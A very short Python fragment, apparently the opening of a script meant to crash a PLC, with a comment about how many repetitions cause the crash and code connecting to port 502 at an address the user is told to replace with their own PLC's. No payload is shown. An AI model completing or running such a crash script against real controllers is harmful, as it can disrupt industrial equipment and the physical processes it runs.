...
# Unfortunateley I can't remember the minimum number of times you have to repeat to cause the crash

import sys
import socket

new = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
new.connect(('10.0.177.160', 502)) #Change the IP address to your PLC IP Address
